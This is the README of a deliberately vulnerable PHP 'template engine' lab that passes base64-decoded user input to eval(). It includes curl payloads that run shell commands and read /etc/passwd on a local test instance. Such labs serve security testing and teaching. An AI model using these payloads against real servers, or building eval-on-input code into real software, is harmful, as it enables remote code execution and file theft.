# QuickReport — Vulnerable Template Engine

Deliberately vulnerable PHP application for security testing. A "template engine" that accepts base64-encoded templates and executes them via `eval()`.

> **WARNING**: This app is intentionally vulnerable. Run it only in Docker for isolation. Never expose it to the internet.

## Setup

```bash
docker build -t quickreport .
docker run --rm -p 8080:8080 quickreport
```

Open http://localhost:8080

## How it works

1. User writes an HTML template with PHP expressions like `<?= date('Y-m-d') ?>`
2. The template is base64-encoded and sent via POST
3. The server decodes the base64 and passes it to `eval()`
4. The rendered output is returned

The **legitimate use case** for base64: safely transporting HTML with special characters and embedded PHP tags over HTTP without encoding issues.

The **vulnerability**: `eval('?>' . $template)` in `render.php` executes any PHP code that comes out of the base64 decode — no sanitization, no allowlist.

## Testing payloads

### Via curl

```bash
# Server info
PAYLOAD=$(echo -n '<?php phpinfo(); ?>' | base64)
curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"

# Command execution
PAYLOAD=$(echo -n '<?php echo shell_exec("whoami"); ?>' | base64)
curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"

# Read files
PAYLOAD=$(echo -n '<?php echo file_get_contents("/etc/passwd"); ?>' | base64)
curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"

# List directory
PAYLOAD=$(echo -n '<?php echo implode("\n", scandir("/")); ?>' | base64)
curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"

# Backtick shorthand
PAYLOAD=$(echo -n '<?= `ls -la /` ?>' | base64)
curl -s -X POST http://localhost:8080/render.php -d "template=$PAYLOAD"
```

### Via the web UI

Paste any of the above PHP snippets (without base64 encoding) into the "Template" text area and click **Render Template** — the UI encodes it automatically.

## Files

| File | Purpose |
|------|---------|
| `index.php` | Frontend with template editor and auto-base64 encoding |
| `render.php` | Backend — decodes base64 and `eval()`s it (the vulnerable endpoint) |
| `Dockerfile` | PHP 8.3 built-in server on port 8080 |
